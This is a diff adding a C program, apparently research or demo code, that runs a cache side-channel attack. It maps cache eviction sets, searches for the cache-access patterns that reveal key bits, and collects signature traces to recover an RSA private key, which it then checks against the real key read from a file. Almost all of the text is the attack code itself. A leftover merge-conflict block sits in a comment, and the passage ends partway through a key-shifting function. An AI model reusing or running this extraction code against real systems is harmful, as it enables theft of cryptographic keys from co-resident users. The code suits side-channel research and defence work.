@@ -1,0 +1,880 @@
+#include <math.h>
+#include <sys/time.h>
+#include <stdlib.h>
+#include <time.h>
+#include "sched.h"
+#include <stdio.h>
+#include <stdlib.h>
+#include <openssl/pem.h>
+#include <openssl/rsa.h>
+#include <gmp.h>
+//#include <gnutls/gnutls.h>
+//#include <nettle/nettle-types.h>
+
+///Yakir &naama
+#include "EvictionSet.h"
+
+#define ANSI_COLOR_RED     "\x1b[31m"
+#define ANSI_COLOR_GREEN   "\x1b[32m"
+#define ANSI_COLOR_YELLOW  "\x1b[33m"
+#define ANSI_COLOR_BLUE    "\x1b[34m"
+#define ANSI_COLOR_MAGENTA "\x1b[35m"
+#define ANSI_COLOR_CYAN    "\x1b[36m"
+#define ANSI_COLOR_RESET   "\x1b[0m"
+
+unsigned int mask1[8] = {0b01111111, 0b00111111, 0b00011111, 0b00001111, 0b00000111, 0b00000011, 0b00000001, 0b00000000};
+unsigned int mask2[8] = {0b00000000, 0b10000000, 0b11000000, 0b11100000, 0b11110000, 0b11111000, 0b11111100, 0b11111110};
+unsigned int mask3[8] = {0b10000000, 0b01000000, 0b00100000, 0b00010000, 0b00001000, 0b00000100, 0b00000010, 0b00000001};
+
+
+char Space[60000000];
+char Space1[LINES_IN_CACHE * BYTES_IN_LINE * 3];
+char Space2[65000];
+char Space3[256500];
+
+//#define DEMO 1
+#define TIMES_TO_TEST_EACH_NUM_OF_SAMPLES 1000
+#define POTENTIAL_SETS 10
+#define CERTFILE "cert.pem"
+#define KEYFILE "privateKey.key"
+//#define KEYFILE "private.pem.2"
+
+#if KEYS_LEN_IN_BITS == 4096
+//#define PATTERN_LEN 7
+//#define PATTERN_LEN 8
+char OnesPattern[] = {1, 1, 1, 1, 1, 1, 1};
+//char OnesPattern[] = {1, 1, 1, 1, 1, 1, 1, 1};
+char ZerosPattern[] = {1, 1, 1, 0, 0, 0, 0};
+//char ZerosPattern[] = {1, 1, 1, 0, 0, 0, 0, 0};
+#else
+//#define PATTERN_LEN 6
+char OnesPattern[] = {1, 1, 1, 1, 1, 1};
+char ZerosPattern[] = {1, 1, 1, 0, 0, 0};
+#endif
+
+LinesBuffer Buffer;
+
+Cache_Mapping EvictionSets;
+
+Cache_Statistics FirstStatistics;
+Cache_Statistics SecondStatistics;
+Cache_Statistics DiffStatistics1, DiffStatistics2;
+
+const char *buff_to_binary(char* x, int Len, char* Result);
+char *ShiftKey(int bit, char* key);
+
+
+int main()
+{
+	char Input[100];
+	int SetsToMonitor[SETS_IN_CACHE][2];
+	int SetsToMonitorNum;
+	int Set;
+	int i;
+	int res;
+	memset(&Buffer, 0, sizeof(Buffer));
+ 	//Temp();
+
+	// ------------------------------------ for guy's key ------------------------------------ //
+//		RsaKeys[0] = StringToBuff(Realkey);
+
+	// ------------------------------------ for demo's key ------------------------------------ //
+	char keyFileName[20];
+	sprintf(keyFileName, KEYFILE);
+	FILE *fd = fopen(keyFileName, "r");
+	//	fread(RsaKeys[0], 4096, 1, fd);
+	EVP_PKEY* privkey = NULL;
+	if (!PEM_read_PrivateKey(fd, &privkey, NULL, NULL))
+	{
+		fprintf(stderr, "Error loading RSA Private Key File.\n");
+		return 2;
+	}
+	RSA* pRsa = privkey->pkey.rsa;
+	char *tempkey;
+	tempkey = malloc(KEYS_LEN_IN_BITS / 8);
+	RsaKeys[0] = malloc(KEYS_LEN_IN_BITS / 8);
+	memcpy(tempkey, (pRsa->d->d), KEYS_LEN_IN_BITS / 8);
+	for (i = 0; i < KEYS_LEN_IN_BITS / 8; i++){
+		RsaKeys[0][i] = tempkey[KEYS_LEN_IN_BITS / 8 - i - 1];
+	}
+	//		mpz_out_str(RsaKeys[0], 16, (MP_INT * )(&pRsa->d));
+	RsaKeys[0][KEYS_LEN_IN_BITS / 8] = 0;
+	EVP_PKEY_free(privkey);
+	fclose(fd);
+
+	printf("\n\n---------------------------------- The real key is ----------------------------------\n");
+	int ByteInKey;
+	for(ByteInKey = 0; ByteInKey < (KEYS_LEN_IN_BITS / BITS_IN_CHAR) / sizeof(int); ByteInKey++)
+	{
+		printf("%08x", htonl(((int*)RsaKeys[0])[ByteInKey]));
+	}
+	printf("\n\n");
+	char RsaKeyAsBits[KEYS_LEN_IN_BITS];
+	const char bytesInBinary[15][5]={"0000","0001","0010","0011","0100","0101","0110","0111","1000","1001","1010","1011","1100","1101","1110","1111"};
+	RsaKeyAsBits[0]=0;
+	for(ByteInKey = 0; ByteInKey < (KEYS_LEN_IN_BITS / BITS_IN_CHAR) / sizeof(int); ByteInKey++)
+	{
+		int i,mask;
+		for( i=28,mask=0xF0000000;i>=0;i-=4,mask=mask>>4)
+		{
+			printf("%08x ",(mask&(htonl(((int*)RsaKeys[0])[ByteInKey])))>>i);
+		}
+//		strcat(RsaKeyAsBits,bytesInBinary[(0xF0&(htonl(((int*)RsaKeys[0])[ByteInKey])))>>4]);
+//		strcat(RsaKeyAsBits,bytesInBinary[0xF&htonl(((int*)RsaKeys[0])[ByteInKey])]);
+	}
+//	printf("%s",RsaKeyAsBits);
+/*	int bitInKey;
+	for(bitInKey = 8; bitInKey < 4096; bitInKey++){
+		ShiftKey(bitInKey, RsaKeys[0]);
+	}
+*/
+/*
+	printf("\n\n---------------------------------- The real key is ----------------------------------\n");
+	int ByteInKey;
+	for(ByteInKey = 0; ByteInKey < (KEYS_LEN_IN_BITS / BITS_IN_CHAR) / sizeof(int); ByteInKey++)
+	{
+		printf("%08x", htonl(((int*)RsaKeys[0])[ByteInKey]));
+	}
+	printf("\n\n");
+*/
+	//	TmpKeys[0] = StringToBuff(RsaKeys[i]);
+
+	// ------------------------------------ for multiple keys key ------------------------------------ //
+	//	for (i = 0; i < NUMBER_OF_DIFFERENT_KEYS; i++){
+	//		char keyFileName[20];
+	//		sprintf(keyFileName, "rand.key", KEYS_LEN_IN_BITS, i);
+	//		FILE* fd = fopen(keyFileName, "r");
+	//		fread(RsaKeys[i], 4096, 1, fd);
+	/*
+			EVP_PKEY* privkey = NULL;
+			if (!PEM_read_PrivateKey(fd, &privkey, NULL, NULL))
+			{
+				fprintf(stderr, "Error loading RSA Private Key File.\n");
+				return 2;
+			}
+			if (privkey == NULL){
+				int x=1;
+			}
+			RSA* pRsa = privkey->pkey.rsa;
+			if (pRsa == NULL){
+				int x=1;
+			}
+			memcpy(RsaKeys[i], (char*) (pRsa->d->d), KEYS_LEN_IN_BITS / 8);
+			RsaKeys[i][KEYS_LEN_IN_BITS / 8] = 0;
+			EVP_PKEY_free(privkey);
+	*/
+
+	//		fclose(fd);
+	//		TmpKeys[i] = StringToBuff(RsaKeys[i]);
+	//	}
+
+
+	if (!DEMO)
+	{
+		printf("\n--------------------------- Start mapping the cache ---------------------------\n");
+	}
+	int SetsFound = CreateEvictionSetFromBuff(&Buffer, &EvictionSets);
+	printf("\nTotal Sets found: %d\r\n\n", SetsFound);
+//	if (DEMO){
+//		scanf("%s", Input);
+//		printf("\033[3A                              \n                                \n                               \n                                   \r");
+//	}
+
+	/*
+	printf("Press any key to initial statistics\r\n");
+	scanf("%s", Input);
+	printf("Getting initial memory statistics\r\n");
+	GetMemoryStatistics(&EvictionSets, &FirstStatistics, 10000000);
+	WriteStatisticsToFile(&FirstStatistics, "FirstStatistics.txt", 1);
+
+
+	printf("Press any key to get the secondary statistics\r\n");
+	scanf("%s", Input);
+	printf("Getting secondary memory statistics\r\n");
+	GetMemoryStatistics(&EvictionSets, &SecondStatistics, 10000000);
+	WriteStatisticsToFile(&SecondStatistics, "SecondStatistics.txt", 1);
+
+	memset(&DiffStatistics1, 0, sizeof(DiffStatistics1));
+	for (Set = 0; Set < SetsFound; Set++)
+	{
+		DiffStatistics1.SetStats[Set].num = (SecondStatistics.SetStats[Set].num > FirstStatistics.SetStats[Set].num) ?
+				(SecondStatistics.SetStats[Set].num - FirstStatistics.SetStats[Set].num) : 0;
+	}
+
+<<<<<<< HEAD
+
+
+	WriteStatisticsToFile(&DiffStatistics1, "DiffStatistics1.txt", 1);
+
+=======
+
+
+	WriteStatisticsToFile(&DiffStatistics1, "DiffStatistics1.txt", 1);
+
+>>>>>>> 14877206551cd7f685f77c0836afdb5cfa43bd05
+*/
+	/*
+	printf("Press any key to get the tertiary statistics\r\n");
+	scanf("%s", Input);
+	printf("Getting tertiary memory statistics\r\n");
+	GetMemoryStatistics(&EvictionSets, &ThirdStatistics, 10000000);
+	WriteStatisticsToFile(&ThirdStatistics, "ThirdStatistics.txt", 1);
+	memset(&DiffStatistics2, 0, sizeof(DiffStatistics2));
+	for (Set = 0; Set < SetsFound; Set++)
+	{
+		DiffStatistics2.SetStats[Set].num = (ThirdStatistics.SetStats[Set].num > FirstStatistics.SetStats[Set].num) ?
+				(ThirdStatistics.SetStats[Set].num - FirstStatistics.SetStats[Set].num) : 0;
+	}
+	WriteStatisticsToFile(&DiffStatistics2, "DiffStatistics2.txt", 1);
+	 */
+
+//int attempts = 1;
+//while (attempts <= 2){
+
+
+	printf("\n------------------------- Look For The Best Pattern Stage 1 -------------------------\n");
+//	printf("Press any key: ");
+//	scanf("%s", Input);
+//printf("\n\n");
+//MAX_WRONG_ONES = 0;
+//MAX_WRONG_ZEROS = 1;
+	unsigned int AccumScores[PATTERN_LEN + 1][PATTERN_LEN + 1], TempScore;
+	int SetsWithGoodScore[PATTERN_LEN][PATTERN_LEN][SetsFound];
+	memset (AccumScores, 0, sizeof(AccumScores));
+	memset (SetsWithGoodScore, 0, sizeof(SetsWithGoodScore));
+	char Ones[PATTERN_LEN];
+	char Zeros[PATTERN_LEN];
+	int Bit, OnesNum, ZerosNum;
+	for (Set = 0; Set < SetsFound; Set++){
+		printf("rating set number %d\n\033[A", Set+1);
+		TempScore = RatePatternsInSet(&EvictionSets.Sets[Set], Ones, Zeros, PATTERN_LEN, 7000, NULL, 1, AccumScores);
+//		TempScore = RatePatternsInSet(&EvictionSets.Sets[Set], Ones, Zeros, PATTERN_LEN, 10500, NULL, 1, AccumScores);
+		OnesNum = -1;
+		ZerosNum = -1;
+		for (Bit = 0; Bit < PATTERN_LEN; Bit++){
+			OnesNum += Ones[Bit];
+			ZerosNum += Zeros[Bit];
+		}
+//		if (TempScore){
+//			TempScore = RatePatternsInSet(&EvictionSets.Sets[Set], Ones, Zeros, PATTERN_LEN, 300000, NULL, 1);
+//			AccumScores[OnesNum][ZerosNum] += TempScore;
+//			SetsWithGoodScore[OnesNum - 1][ZerosNum - 1][Set] = 1;
+//		}
+
+//if (!(Set % 100)){
+if (TempScore){
+printf("Set_%d_%d\n",Set, AccumScores[OnesNum][ZerosNum]);
+	for (Bit = 0; Bit < PATTERN_LEN; Bit++) printf("%d", Ones[Bit]);
+printf(", ");
+	for (Bit = 0; Bit < PATTERN_LEN; Bit++) printf("%d", Zeros[Bit]);
+//printf("\n\033[2A");
+printf("\n");
+}
+	}
+printf("\n\n");
+	int row,col;
+	TempScore = 0;
+//printf("test_2\n");
+//Best patterns method one
+	for (row = 0; row < PATTERN_LEN; row++){
+		for (col = 0; col < PATTERN_LEN; col++){
+			printf("%10d    ", AccumScores[row][col]);
+			if (AccumScores[row][col] > TempScore){
+				TempScore = AccumScores[row][col];
+				OnesNum = row + 1;
+				ZerosNum = col + 1;
+			}
+		}
+		printf("\n");
+	}
+
+//Best patterns method two
+	for (row = 0; row < PATTERN_LEN; row++){
+		for (col = 0; col < PATTERN_LEN; col++){
+			AccumScores[row][PATTERN_LEN] += AccumScores[row][col];
+			AccumScores[PATTERN_LEN][col] += AccumScores[row][col];
+		}
+	}
+//rows
+	TempScore = 0;
+	for (row = 0; row < PATTERN_LEN; row++){
+		if (AccumScores[row][PATTERN_LEN] > TempScore){
+			TempScore = AccumScores[row][PATTERN_LEN];
+			OnesNum = row + 1;
+		}
+	}
+	TempScore = 0;
+	row = OnesNum - 1;
+	for (col = 0; col < PATTERN_LEN; col++){
+		if (TempScore < AccumScores[row][col]){
+			TempScore = AccumScores[row][col];
+			ZerosNum = col + 1;
+		}
+	}
+	int OnesNumA = OnesNum, ZerosNumA = ZerosNum;
+
+// columns
+	TempScore = 0;
+	for (col = 0; col < PATTERN_LEN; col++){
+		if (AccumScores[PATTERN_LEN][col] > TempScore){
+			TempScore = AccumScores[PATTERN_LEN][col];
+			ZerosNum = col + 1;
+		}
+	}
+	TempScore = 0;
+	col = ZerosNum - 1;
+	for (row = 0; row < PATTERN_LEN; row++){
+		if (TempScore < AccumScores[row][col]){
+			TempScore = AccumScores[row][col];
+			OnesNum = row + 1;
+		}
+	}
+	int OnesNumB = OnesNum, ZerosNumB = ZerosNum;
+//start scoring final 2 candidates
+
+	memset (AccumScores, 0, sizeof(AccumScores));
+//set pattern from rows winner
+	for (Bit = 0; Bit < PATTERN_LEN; Bit++){
+		if (Bit < OnesNumA)
+			Ones[Bit] = 1;
+		else
+			Ones[Bit] = 0;
+		if (Bit < ZerosNumA)
+			Zeros[Bit] = 1;
+		else
+			Zeros[Bit] = 0;
+	}
+
+//if tie break is needed
+	if (ZerosNumA != ZerosNumB || OnesNumA != OnesNumB){
+//score good sets of the rows pattern
+		for (Set = 0; Set < SetsFound; Set++){
+//			if (SetsWithGoodScore[OnesNumA - 1][ZerosNumA - 1][Set] == 0) continue;
+			AccumScores[OnesNumA - 1][ZerosNumA - 1] += RatePatternsInSet(&EvictionSets.Sets[SetsWithGoodScore[OnesNumA - 1][ZerosNumA - 1][Set]],
+				 Ones, Zeros, PATTERN_LEN, 3500, NULL, 0, NULL);
+		}
+
+//set pattern from columns winner
+		for (Bit = 0; Bit < PATTERN_LEN; Bit++){
+			if (Bit < OnesNumB)
+				Ones[Bit] = 1;
+			else
+				Ones[Bit] = 0;
+			if (Bit < ZerosNumB)
+				Zeros[Bit] = 1;
+			else
+				Zeros[Bit] = 0;
+		}
+//score good sets of the columns pattern
+		for (Set = 0; Set < SetsFound; Set++){
+//			if (SetsWithGoodScore[OnesNumB - 1][ZerosNumB - 1][Set] == 0) continue;
+			AccumScores[OnesNumB - 1][ZerosNumB - 1] += RatePatternsInSet(&EvictionSets.Sets[SetsWithGoodScore[OnesNumB - 1][ZerosNumB - 1][Set]], 
+				Ones, Zeros, PATTERN_LEN, 3500, NULL, 0, NULL);
+		}
+
+		printf("rows score: %d, columns score: %d\n", AccumScores[OnesNumA - 1][ZerosNumA - 1], 
+			AccumScores[OnesNumB - 1][ZerosNumB - 1]);
+//find the best pattern between the row and column winners
+		if (AccumScores[OnesNumB - 1][ZerosNumB - 1] > AccumScores[OnesNumA - 1][ZerosNumA - 1]){
+			ZerosNum = ZerosNumB;
+			OnesNum = OnesNumB;
+		}
+		else{
+			ZerosNum = ZerosNumA;
+			OnesNum = OnesNumA;
+		}
+	}
+
+//set the best patterns
+	for (Bit = 0; Bit < PATTERN_LEN; Bit++){
+		if (Bit < OnesNum)
+			OnesPattern[Bit] = 1;
+		else
+			OnesPattern[Bit] = 0;
+		if (Bit < ZerosNum)
+			ZerosPattern[Bit] = 1;
+		else
+			ZerosPattern[Bit] = 0;
+	}
+	printf("the chosen patterns are: ");
+	for (Bit = 0; Bit < PATTERN_LEN; Bit++) printf("%d", ZerosPattern[Bit]);
+	printf(", ");
+	for (Bit = 0; Bit < PATTERN_LEN; Bit++) printf("%d", OnesPattern[Bit]);
+	printf("\n");
+
+//UNTIL HERE FIND BEST PATTERN
+
+
+
+/*
+	char Ones[] = {1, 1, 1, 1, 1, 1, 1};
+	char Zeros[] = {1, 0, 0, 0, 0, 0, 0};
+	long int AccumScore[PATTERN_LEN - 1] = {0};
+	int GoodSetsByPatternNum[PATTERN_LEN - 1][SETS_IN_CACHE] = {0};
+	int NumOfGoodSets[PATTERN_LEN] = {0};
+	int BestPatternNum = 0, PatternNum;
+//	for (PatternNum = 0; PatternNum < (PATTERN_LEN - 1); PatternNum++){
+	for (PatternNum = 1; PatternNum < 3; PatternNum++){
+		Zeros[PatternNum] = 1;
+		for (Set = 0; Set < SetsFound; Set++){
+			int TempScore = 0;
+			if (EvictionSets.Sets[Set].ValidLines == 12) 
+				TempScore = RatePatternsInSet(&EvictionSets.Sets[Set], Ones, Zeros, PATTERN_LEN, 3500, NULL, 1);
+			if (TempScore > 500){
+//			if (TempScore){
+				AccumScore[PatternNum] += TempScore;
+				printf("%d\n\033[1A",AccumScore[PatternNum]);
+				GoodSetsByPatternNum[PatternNum][NumOfGoodSets[PatternNum]++] = Set;
+//			}
+			}
+		}
+/*		if (AccumScore[PatternNum] > AccumScore[BestPatternNum]){
+			BestPatternNum = PatternNum;
+			memcpy(ZerosPattern, Zeros, PATTERN_LEN);
+		}
+*/ /*		printf("%d, %d, ", AccumScore[PatternNum], BestPatternNum);
+		int Bit;
+		for (Bit = 0; Bit < PATTERN_LEN; Bit++) printf("%d", ZerosPattern[Bit]);
+		printf(", ");
+		for (Bit = 0; Bit < PATTERN_LEN; Bit++) printf("%d", Zeros[Bit]);
+		printf("\n");
+
+	}
+
+
+	printf("\n------------------------- Look For The Best Pattern Stage 2 -------------------------\n");
+
+	int PatternNum;
+	for (PatternNum = 0; PatternNum < PATTERN_LEN - 1; PatternNum++) AccumScore[PatternNum] = 0 ;
+	memset(&Zeros[1], 0, PATTERN_LEN);
+
+	for (PatternNum = 1; PatternNum < 3; PatternNum++){
+		Zeros[PatternNum] = 1;
+		for (Set = 0; Set < NumOfGoodSets[PatternNum]; Set++){
+			int TempScore = 0;
+			if (EvictionSets.Sets[Set].ValidLines == 12){
+				TempScore = RatePatternsInSet(&EvictionSets.Sets[GoodSetsByPatternNum[PatternNum][Set]], 
+					Ones, Zeros, PATTERN_LEN, 1000000, NULL, 1);
+				AccumScore[PatternNum] += TempScore;
+			}
+		}
+		if (AccumScore[PatternNum] > AccumScore[BestPatternNum]){
+			BestPatternNum = PatternNum;
+			memcpy(ZerosPattern, Zeros, PATTERN_LEN);
+		}
+		printf("%d, %d, ", AccumScore[PatternNum], BestPatternNum);
+		int Bit;
+		for (Bit = 0; Bit < PATTERN_LEN; Bit++) printf("%d", ZerosPattern[Bit]);
+		printf(", ");
+		for (Bit = 0; Bit < PATTERN_LEN; Bit++) printf("%d", Zeros[Bit]);
+		printf("\n");
+
+
+	}
+*/
+
+	printf("\n------------------------- Search for the best sets -------------------------\n");
+//MAX_WRONG_ONES = 1;
+//MAX_WRONG_ZEROS = 1;
+
+//	printf("\n---------------------------------- First Filter: ----------------------------------\n");
+//memset (OnesPattern, 1, 3);
+//memset (OnesPattern+3, 0, 4);
+//memset (OnesPattern, 1, sizeof(OnesPattern));
+
+	if(DEMO){
+		printf("Press any key: ");
+
+		scanf("%s", Input);
+	}
+	// Now find which sets are relevant
+	memset(SetsToMonitor, 0, sizeof(int) * SETS_IN_CACHE * 2);
+	SetsToMonitorNum = 0;
+	//double normalizedScore[2][KEYS_LEN_IN_BITS];
+	//memset(normalizedScore, 0, sizeof(double) * 2 * KEYS_LEN_IN_BITS);
+	for (Set = 0; Set < SetsFound; Set++)
+	{
+		//if ((DiffStatistics1.SetStats[Set].num < CACHE_POLL_SAMPLES_PER_SET * 0.1))
+		//	continue;
+
+		char fname[100];
+		sprintf(fname, "set_%d_samples.txt", Set);
+
+		int TempScore = 0;
+		if (EvictionSets.Sets[Set].ValidLines == 12) {
+
+			TempScore = RatePatternsInSet(&EvictionSets.Sets[Set], OnesPattern, ZerosPattern, PATTERN_LEN,
+					3500, NULL, 0, NULL);
+//			TempScore = RatePatternsInSet(&EvictionSets.Sets[Set], OnesPattern, ZerosPattern, PATTERN_LEN,
+//								3500, fname);
+		}
+
+		if (TempScore > 500)
+//		if (TempScore > 600)
+		{
+			printf("                                     \rSet: %d has score %d\r\n\033[1A", Set, TempScore);
+			SetsToMonitor[SetsToMonitorNum][0] = Set;
+			SetsToMonitor[SetsToMonitorNum++][1] = TempScore;
+			//normalizedScore[0][Set] = (double)(TempScore) / 5000;
+
+		}
+		//		}
+	}
+
+//	printf("\n\n---------------------------------- Second Filter ----------------------------------\n");
+//	if(DEMO){
+//		printf("Press any key.\r\n");
+//		scanf("%s", Input);
+//	}
+//	int BestScore[POTENTIAL_SETS] = {0};
+	int BestScore[SetsToMonitorNum];
+	memset(BestScore, 0, SetsToMonitorNum * sizeof(int));
+//	int BestSet[POTENTIAL_SETS] = {0};
+	int BestSet[SetsToMonitorNum];
+	memset(BestSet, 0, SetsToMonitorNum * sizeof(int));
+	int j;
+	for (Set = 0; Set < SetsToMonitorNum; Set++)
+	{
+
+		char fname[100];
+		sprintf(fname, "samples/set_%d_samples.txt", SetsToMonitor[Set][0]);
+		int TempScore = RatePatternsInSet(&EvictionSets.Sets[SetsToMonitor[Set][0]], OnesPattern, ZerosPattern, 
+			PATTERN_LEN, 300000, fname, 0, NULL);
+//RatePatternsInSet(&EvictionSets.Sets[SetsToMonitor[Set][0]], OnesPattern, ZerosPattern, 
+//	PATTERN_LEN, 300000, NULL, 1);
+printf("\n");
+
+		printf("                                          \rSet: %d has score %d\r\n\033[1A", SetsToMonitor[Set][0], TempScore);
+
+		for (i = 0; i < POTENTIAL_SETS; i++){
+			if (TempScore >= BestScore[i])
+//			if (TempScore >= BestScore[i] && fabs(normalizedScore[0][SetsToMonitor[Set][0]]) > (0.9 * (double)(BestScore[i]) / 100000))
+			{
+				for(j = (SetsToMonitorNum - 1); j > i; j--){
+//				for(j = (POTENTIAL_SETS - 1); j > i; j--){
+
+					BestScore[j] = BestScore[j-1];
+					BestSet[j] = BestSet[j-1];
+				}
+				BestScore[i] = TempScore;
+				BestSet[i] = SetsToMonitor[Set][0];
+				break;
+			}
+		}
+	}
+	if (DEMO){
+//		system("clear");
+printf("\n%d sets to monitor", SetsToMonitorNum);
+		printf("\n\n-------------------------- The best 10 sets are -------------------------\n");
+
+		for (Set = 0; Set < (POTENTIAL_SETS + 5); Set++)
+			printf("%d) set number %d with score %d\n", Set + 1, BestSet[Set], BestScore[Set]);
+//		printf("Press any key.\r\n");
+//		scanf("%s", Input);
+	}
+	else{
+		printf("\nbest sets are %d, %d, %d, %d, %d\r\n\n", BestSet[0], BestSet[1], BestSet[2], BestSet[3], BestSet[4]);
+//		printf("Press any key to start getting the data\r\n");
+//		scanf("%s", Input);
+	}
+	i=-1;
+	int CorrectKeys = 0;
+	//	int ValidSets = 2;
+	//	int SetToSampleWith;
+
+	int numOfSamples;
+	char line[100];
+
+
+
+	FILE *f;
+	f = fopen("statistics_20-140", "wr");
+	int nextCandidate = 5;				//init next candidate
+	for (numOfSamples = 200; numOfSamples <= 1000; numOfSamples += 5000){
+//		if (numOfSamples > 10){
+//			numOfSamples += 1;
+//		}
+		printf("\r\n\n-------------------------- Collect signature traces --------------------------\r\n", numOfSamples);
+		if (!DEMO){
+			printf("Press any key: ");
+			scanf("%s",Input);
+		}
+
+		CorrectKeys = 0;
+		memset(line, 0, 100);
+		sprintf(line, "%d Samples\r\n:		", numOfSamples);
+		fwrite(line, strlen(line), 1, f);
+		for (j = 0; j < TIMES_TO_TEST_EACH_NUM_OF_SAMPLES; j++){
+			if (DEMO){
+				printf("Press any key to start collecting traces of next set: ");
+				scanf("%s",Input);
+				//system("clear");
+			}
+			printf("\nCollecting traces of set %d:\r\n", BestSet[(j % POTENTIAL_SETS)]);
+
+//		while (1){
+			//printf("set %d\r\n", BestSet[j%POTENTIAL_SETS]);
+			char* pKey = ExtractKeyFromSet(&EvictionSets.Sets[BestSet[j%POTENTIAL_SETS]], OnesPattern, ZerosPattern, PATTERN_LEN, numOfSamples);
+			
+			if (pKey == NULL) {
+				printf("Not enough traces from set %d\r\nskipping to next set\r\n\r\n", BestSet[j%POTENTIAL_SETS]);
+				continue;
+			}
+
+			int Equal = 1;
+			if (pKey != NULL){
+				Equal =  memcmp(pKey, RsaKeys[0], KEYS_LEN_IN_BITS / BITS_IN_CHAR);
+			}
+			else {
+				printf("\033[8A");
+				continue;
+			}
+//			for(ByteInKey = 0; ByteInKey < (KEYS_LEN_IN_BITS / BITS_IN_CHAR) / sizeof(int); ByteInKey++)
+//			{
+//				if (pKey == NULL)
+//					break;
+//				printf("%08x", htonl(((int*)pKey)[ByteInKey]));
+//			}
+//			printf("\r\n");
+			if (Equal == 0){
+				if(DEMO){
+					for (ByteInKey = 0; ByteInKey < (KEYS_LEN_IN_BITS / BITS_IN_CHAR) / sizeof(int); ByteInKey++){
+						printf("%08x", htonl(((int*)pKey)[ByteInKey]));
+					}
+					printf("\r\n");
+				}
+				printf("The key is CORRECT!\r\n");
+				
+
+				
+			}
+			else{
+				if (DEMO){
+					int WrongBits = 0;
+					for (ByteInKey = 0; ByteInKey < (KEYS_LEN_IN_BITS / BITS_IN_CHAR); ByteInKey++){
+						if (RsaKeys[0][ByteInKey] != pKey[ByteInKey]) {
+							int bits;
+
+							for (bits = 0; bits < BITS_IN_CHAR; bits++) {
+								WrongBits += (((RsaKeys[0][ByteInKey] ^ pKey[ByteInKey]) >> bits) & 1);
+							}
+							printf(ANSI_COLOR_RED "%02x" ANSI_COLOR_RESET, (unsigned char)pKey[ByteInKey]);
+						} else {
+							printf("%02x", (unsigned char)pKey[ByteInKey]);
+						}
+					}
+					printf("\r\n");
+					printf("The key is WRONG!\r\n");
+					printf("%d out of %d bits were wrong\r\n\n", WrongBits, KEYS_LEN_IN_BITS);
+/*
+					if (WrongBits < 10){				// repeat set if it has only flip bits
+						j--;
+					}
+*/
+					int zerosCounter = 0;
+					for (ByteInKey = 511; ByteInKey >= 0; ByteInKey--){			//how many zeros?
+						if (pKey[ByteInKey] == 0){
+							zerosCounter++;
+						}
+						else {
+							break;
+						}
+					}
+					if (zerosCounter > 5 && nextCandidate < SetsToMonitorNum && BestScore[nextCandidate] != 0){				//if key has lot of zeros at the end, replace set with next best score set
+						BestSet[j % POTENTIAL_SETS] = BestSet[nextCandidate];
+						nextCandidate++;
+					}
+					else{						//if all (almost) bits found try shift
+						int bit;
+						for (bit = 0; bit < KEYS_LEN_IN_BITS; bit++){
+//if (bit<2){
+//printf("press\n");							
+//scanf("%s",Input);
+//}
+							char *pShiftedKey = ShiftKey(bit, pKey);
+							Equal =  memcmp(pShiftedKey, RsaKeys[0], KEYS_LEN_IN_BITS / BITS_IN_CHAR);
+							/*
+							if (Equal && ((bit + 1) == KEYS_LEN_IN_BITS)){
+								int WrongBits = 0;
+								for (ByteInKey = 0; ByteInKey < (KEYS_LEN_IN_BITS / BITS_IN_CHAR); ByteInKey++){
+									if (RsaKeys[0][ByteInKey] != pShiftedKey[ByteInKey]) {
+										int bits;
+
+
+										for (bits = 0; bits < BITS_IN_CHAR; bits++) {
+											WrongBits += (((RsaKeys[0][ByteInKey] ^ pShiftedKey[ByteInKey]) >> bits) & 1);
+										}
+										printf(ANSI_COLOR_RED "%02x" ANSI_COLOR_RESET, (unsigned char)pShiftedKey[ByteInKey]);
+									} else {
+										printf("%02x", (unsigned char)pShiftedKey[ByteInKey]);
+									}
+								}
+								printf("\r\n");
+								printf("Shifted key is WRONG!\r\n");
+								printf("%d out of %d bits were wrong\r\n\n", WrongBits, KEYS_LEN_IN_BITS);
+
+								
+							}
+							else{ 
+*/
+							if (!Equal){
+								printf("shifted key is CORRECT!\n");
+								sleep(7);
+								for (ByteInKey = 0; ByteInKey < (KEYS_LEN_IN_BITS / BITS_IN_CHAR) / sizeof(int); ByteInKey++){
+									printf("%08x", htonl(((int*)pShiftedKey)[ByteInKey]));
+								}
+								printf("\r\n");
+								printf("shifted key is CORRECT!\n");
+								break;
+							} 
+
+						}
+					}
+/*
+					if (zerosCounter < 5)			//repeat set if there is only 
+						j--;
+*/
+					//printf("\033[22A");
+				}
+				else{
+					printf("The key is WRONG! \r\nTry again...\n");
+				}
+//				memset(line, 0, 100);
+//				sprintf(line, "%d  ", j);
+//				fwrite(line, strlen(line), 1, f);
+			}
+			if (pKey)
+				free(pKey);
+		}
+		if (CorrectKeys){
+			memset(line, 0, 100);
+			//sprintf(line, "\r\Attempt number %d: Success after %d tries", attempts, j);
+		}
+		fwrite(line, strlen(line), 1, f);
+//		memset(line, 0, 100);
+//		sprintf(line, "\r\nSuccess in \%:  %d\%\r\n\r\n", CorrectKeys*100/TIMES_TO_TEST_EACH_NUM_OF_SAMPLES);
+		fwrite(line, strlen(line), 1, f);
+	}
+	fclose(f);
+	printf("\r\nDone\r\n");
+//attempts++;
+//}
+	return 0;
+}
+
+char *ShiftKey(int bit, char* key){
+	char Input[100];
+	char tempChar;
+	int currChar, currBit;
+	int charNumber = bit / 8;
+	int bitNumberInChar = bit % 8;
+	unsigned char tempBit = 0x01;
+	unsigned char * tempKey = malloc(sizeof(char) * (KEYS_LEN_IN_BITS / 8));
+	memcpy(tempKey, key, sizeof(char) * KEYS_LEN_IN_BITS / BITS_IN_CHAR); 
+	for (currChar = 511; currChar > charNumber; currChar--){			//for all c
+//printf("char num = %d  -  %1x", currChar, htonl(((unsigned char*)tempKey)[currChar]));
+//scanf("%s", Input);
+		tempChar = tempKey[currChar];					//save char so first bit wont lost after shift
+		tempKey[currChar] = tempKey[currChar] << 1;				//shift left current char
+//printf("%1x", htonl((tempKey)[currChar]));
+//scanf("%s", Input);
+		tempKey[currChar] = tempKey[currChar] | tempBit;			//add first bit of previous char
+//printf("%1x", htonl((tempKey)[currChar]));
+		tempBit = (tempChar & 0x80) >> 7;				//save first bit of current char		
+//printf("%x", tempKey[currChar]);
+//scanf("%s", Input);
+	}
+/*
+	for (currBit = 0; currBit < 8; currBit++){				//create mask
+//printf("currBit is %d\n", currBit);
+		if (currBit < bit)
+			mask1 += pow(2,currBit);
+		if (currBit > bit)
+			mask2 += pow(2,currBit);
+	}
+*/
+//printf("bit=%d, mask1=%d, mask2=%d", bit, mask1[bit % 8], mask2[bit % 8]);
+//scanf("%s", Input);
+	tempChar = (tempKey[charNumber] & mask1[bit % 8]) << 1;
